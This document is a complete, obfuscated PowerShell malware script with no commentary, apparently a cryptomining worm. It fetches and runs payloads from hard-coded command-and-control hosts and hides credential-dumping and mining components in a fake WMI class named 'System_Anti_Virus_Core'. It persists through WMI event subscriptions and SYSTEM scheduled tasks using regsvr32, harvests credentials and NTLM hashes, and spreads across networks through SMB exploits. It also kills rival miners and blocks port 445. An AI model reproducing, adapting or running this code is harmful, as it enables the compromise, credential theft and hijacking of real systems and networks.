Remove-Item C:\Windows\SGFpbCBRdWVlbg.txt
$se=@(('update.7h4uk.com'),('185.128.43.62'),('info.7h4uk.com'))
$nic=('update.7h4uk.com')
foreach($t in $se)
{
	$pin=TEsT-CoNNEcTioN $t
	if ($pin -ne $null)
	{
		$nic=$t
		break
	}
}
$nic=$nic+(':443')

if ((geT-WmIObjECt Win32_OperatingSystem).osarchitecture.contains('32'))
{
	iEX(NEW-oBJECT Net.WebClient).DownloadString("http://$nic/antitrojan.ps1")
	return
}

$mimi = $miiiiii
$mon = $mmmmmmm
$funs = $fffffff
$vcp = $cppppppp
$vcr = $crrrrrrr
$sc = $ssssssss

try{
    $StaticClass = NEw-obJEcT Management.ManagementClass((('root{0}default')-F  [cHAR]92), $null,$null)
    $StaticClass.Name = ('System_Anti_Virus_Core')
    $StaticClass.Put() | out-NULl
    $StaticClass.Properties.Add(('mimi') , $mimi)
    $StaticClass.Put() | OUT-NUlL
    $StaticClass.Properties.Add(('mon') , $mon)
    $StaticClass.Put() | ouT-nULL
    $StaticClass.Properties.Add(('vcp') , $vcp)
    $StaticClass.Put() | oUT-nuLL
    $StaticClass.Properties.Add(('vcr') , $vcr)
    $StaticClass.Put() | OUT-null
    $StaticClass.Properties.Add(('funs') , $funs)
    $StaticClass.Put() | OUT-NULl
    $StaticClass.Properties.Add('sc' , $sc)
    $StaticClass.Put() | oUt-NuLL
    $StaticClass.Properties.Add(('ipsu') ," ")
    $StaticClass.Put() | OUt-nULl
    $StaticClass.Properties.Add(('i17') ," ")
    $StaticClass.Put() | OUt-NUlL
    $StaticClass.Properties.Add(('ver'), ('1.5'))
    $StaticClass.Put() | oUt-NUll
} catch {
    $defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
    iEx $defun
		RunDDOS "cohernece.exe"
    $Networks = GET-wmiOBjEct Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}
    [byte[]]$sc=[System.Convert]::FromBase64String($sc)
    foreach ($Network in $Networks)
    {
        $IPAddress  = $Network.IpAddress[0]
        if ($IPAddress -match ('^169.254')){continue}
        $SubnetMask  = $Network.IPSubnet[0]
        $ips_c=Get-networkrange $IPAddress $SubnetMask
        $ips_b=Get-IpInB $IPAddress
        $ips=$ips_c+$ips_b
        $tcpconn = NeTstat -anop tcp
        foreach ($t in $tcpconn)
        {
            $line =$t.split(' ')| ?{$_}
            if (!($line -is [array])){continue}
            if ($line.count -le 4){continue}
            $i=$line[-3].split(':')[0]
            if ( ($line[-2] -eq ('ESTABLISHED')) -and  ($i -ne ('127.0.0.1')) -and ($ips -notcontains $i))
            {
                $ips+=$i
            }
        }
        #if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
        foreach ($ip in $ips)
        {
            #if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
            if ($ip -eq $IPAddress){continue}
						if ((Test-Port $ip) -ne $false -and $ipsu -notcontains $ip)
            {
                $vul=[PingCastle.Scanners.m17sc]::Scan($ip)
                if ($vul -and $i17 -notcontains $ip)
                {
                    $res=EB7 $ip $sc
                    if (!($res -eq $true))
                    {eB8 $ip $sc}
                    $i17 = $i17 + " "+$ip
                }
            }
        }
    }
}

$filterName = ('Windows Events Filter')
$consumerName = ('Windows Events Consumer')
$Script=@'
$se=@('update.7h4uk.com','185.128.43.62','info.7h4uk.com')
$nic='update.7h4uk.com'
foreach($t in $se)
{
    $pin=test-connection $t
    if ($pin -ne $null)
    {
        $nic=$t
        break
    }
}
$nic=$nic+(':443')
$ver=(New-Object Net.WebClient).DownloadString("http://$nic/ver.txt").Trim()
if($ver -ne $null){
    $ver_tmp=([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['ver'].Value
    if($ver -ne $ver_tmp){
        IEX (New-Object Net.WebClient).DownloadString("http://$nic/antivirus.ps1")
        return
    }
}
$stime=[Environment]::TickCount
$funs = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['funs'].Value
$defun=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs))
iex $defun

Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -notmatch 'Windows Events'} |Remove-WmiObject
$dirpath=$env:SystemRoot+'\system32'
if  (!(test-path $dirpath )){
	$dirpath=$env:SystemRoot
}
if (!(test-path ($dirpath+'\msvcp120.dll')))

{sentfile ($dirpath+'\msvcp120.dll') 'vcp'}
if (!(test-path ($dirpath+'\msvcr120.dll')))
{sentfile ($dirpath+'\msvcr120.dll') 'vcr'}

[array]$psids= get-process -name powershell |sort cpu -Descending| ForEach-Object {$_.id}
$tcpconn = netstat -anop tcp
$exist=$False
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
        if (($psids[0] -eq $line[-1]) -and $t.contains("ESTABLISHED") -and ($t.contains(":80 ") -or $t.contains(":14444")) )
        {
            $exist=$true
            break
        }
    }
}
RunDDOS "cohernece.exe"
KillBot('System_Anti_Virus_Core')
foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if (!($line -is [array])){continue}
        if (($line[-3].contains(":3333") -or $line[-3].contains(":5555") -or $line[-3].contains(":7777")) -and $t.contains("ESTABLISHED"))
        {
            $evid=$line[-1]
            Get-Process -id $evid | stop-process -force
        }
    }
if (!$exist -and ($psids.count -le 8))
{
    $cmdmon="powershell -NoP -NonI -W Hidden "$mon = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['mon'].Value;$funs = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['funs'].Value ;iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs)));Invoke-Command  -ScriptBlock $RemoteScriptBlock -ArgumentList @($mon, $mon, 'Void', 0, '', '')""
    $vbs = New-Object -ComObject WScript.Shell
    $vbs.run($cmdmon,0)
}

$NTLM=$False
$mimi = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['mimi'].Value
$a, $NTLM= Get-creds $mimi $mimi

$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -EA Stop | ? {$_.IPEnabled}
$ipsu = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['ipsu'].Value
$i17 = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['i17'].Value
$scba= ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['sc'].Value
[byte[]]$sc=[System.Convert]::FromBase64String($scba)
foreach ($Network in $Networks)
{

    $IPAddress  = $Network.IpAddress[0]
	if ($IPAddress -match '^169.254'){continue}
    $SubnetMask  = $Network.IPSubnet[0]
    $ips_c=Get-networkrange $IPAddress $SubnetMask
    $ips_b=Get-IpInB $IPAddress
    $ips=$ips_c+$ips_b
	$tcpconn = netstat -anop tcp
	foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if (!($line -is [array])){continue}
		if ($line.count -le 4){continue}
		$i=$line[-3].split(':')[0]
        if ( ($line[-2] -eq 'ESTABLISHED') -and  ($i -ne '127.0.0.1') -and ($ips -notcontains $i))
        {
            $ips+=$i
        }
    }
    if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
    foreach ($ip in $ips)
    {
        if (([Environment]::TickCount-$stime)/1000 -gt 5400){break}
        if ($ip -eq $IPAddress){continue}
				if ((Test-Port $ip) -ne $false -and $ipsu -notcontains $ip)
        {
            $re=0
            if ($a.count -ne 0)
            {$re = test-ip -ip $ip -creds $a  -nic $nic -ntlm $NTLM }
            if ($re -eq 1){$ipsu =$ipsu +" "+$ip}
			else
			{
				$vul=[PingCastle.Scanners.m17sc]::Scan($ip)
				if ($vul -and $i17 -notcontains $ip)

				{
					$res=eb7 $ip $sc
					if (!($res -eq $true))
					{eb8 $ip $sc}
					$i17 = $i17 + " "+$ip
				}
			}
        }
    }
 }

$StaticClass=New-Object Management.ManagementClass('root\default:System_Anti_Virus_Core')
$StaticClass.SetPropertyValue('ipsu' ,$ipsu)
$StaticClass.Put()
$StaticClass.SetPropertyValue('i17' ,$i17)
$StaticClass.Put()
'@
$Scriptbytes  = [System.Text.Encoding]::Unicode.GetBytes($Script)
$EncodedScript=[System.Convert]::ToBase64String($Scriptbytes)

$Query = (('SELECT * FROM __InstanceModificationEvent WITHIN 5600 WHERE TargetInstance ISA BiAWin32_PerfFormattedData_PerfOS_SystemBiA').rePlACE(([Char]66+[Char]105+[Char]65),[StRIng][Char]39))

geT-WMIOBJeCt -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter ((('__Path LIKE 361%Windows Events Consumer%361')).rEplaCE(('361'),[STriNG][CHAr]39)) | ReMove-WmiObJEcT
GET-WmIobjEct -Namespace root\Subscription -Class __EventFilter -filter (('name= {0}Windows Events Filter{0}') -F  [ChAR]39) |remoVE-WMIobJect
gEt-wMioBJeCT -Namespace root\Subscription -Class CommandLineEventConsumer -Filter ((('Name=F3oWindows Events ConsumerF3o')).RePLAce(('F3o'),[StRing][cHar]39)) | removE-WMIOBJect

NETSh ipsec static add policy name=netbc
NeTSH ipsec static add filterlist name=block
neTsh ipsec static add filteraction name=block action=block
nETSh ipsec static add filter filterlist=block any srcmask=32 srcport=0 dstaddr=me dstport=445 protocol=tcp description=445
NeTsH ipsec static add rule name=block policy=netbc filterlist=block filteraction=block
netSh ipsec static set policy name=netbc assign=y

$FilterParams = @{
        Namespace = (('rootu7gsubscription')  -CRePLaCE  ([cHAr]117+[cHAr]55+[cHAr]103),[cHAr]92)
        Class = ('__EventFilter')
        Arguments =@{Name=$filterName;EventNameSpace=(('rootDaJcimv2')  -CrePLACE  ([chAr]68+[chAr]97+[chAr]74),[chAr]92);QueryLanguage=('WQL');Query=$Query}
        ErrorAction = ('SilentlyContinue')
    }
$WMIEventFilter = sEt-wmiINStanCe @FilterParams

$ConsumerParams = @{
        Namespace = (('root{0}subscription')  -f  [chAr]92)
        Class = ('CommandLineEventConsumer')
        Arguments =@{ Name = $consumerName; CommandLineTemplate=('powershell.exe -NoP -NonI -W Hidden -E ')+"$EncodedScript"}
        ErrorAction = ('SilentlyContinue')
    }
$WMIEventConsumer = sEt-wMIinStAnce @ConsumerParams

sET-WmiInSTaNCE -Class __FilterToConsumerBinding -Namespace (('rootLBEsubscription').rePLacE('LBE',[StRInG][chaR]92)) -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} | ouT-NULl

SChTASks /create /tn ('WindowsLogTasks') /tr ('regsvr32 /u /s /i:http://185.128.43.62/antivirus.php scrobj.dll') /sc onstart /ru ('System') /F
SchTasKS /create /tn ('System Log Security Check') /tr ('regsvr32 /u /s /i:http://185.128.43.62/antivirus.php scrobj.dll') /sc minute /mo 20 /ru ('System') /F
SchTaskS /delete /tn yastcat /f
if (tEsT-pATh ($env:SystemRoot+(('1emtemp1emy1.bat').replaCe(([CHAR]49+[CHAR]101+[CHAR]109),'\')))){reMOve-Item -Path ($env:SystemRoot+(('KsztempKszy1.bat').REpLaCE(([CHAr]75+[CHAr]115+[CHAr]122),'\')))  -Force}
PoWErcFg /CHANGE -standby-timeout-ac 0
POWErCFG /CHANGE -hibernate-timeout-ac 0
POweRcFg -SetAcValueIndex 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 000

[array]$psids= Get-prOCeSs -name powershell |sOrt cpu -Descending| FoReACH-oBJEcT {$_.id}
$tcpconn = neTSTAT -anop tcp
if ($psids -ne $null )
{
    foreach ($t in $tcpconn)
    {
        $line =$t.split(' ')| ?{$_}
        if ($line -eq $null)
        {continue}
        if (($psids[0] -eq $line[-1]) -and $t.contains(('ESTABLISHED')) -and ($t.contains((':80 ')) -or $t.contains((':14444'))) )
        {
            gET-PROCESS -id $psids[0] | sTOP-PRocesS -force
            break
        }
    }
}

IeX $script

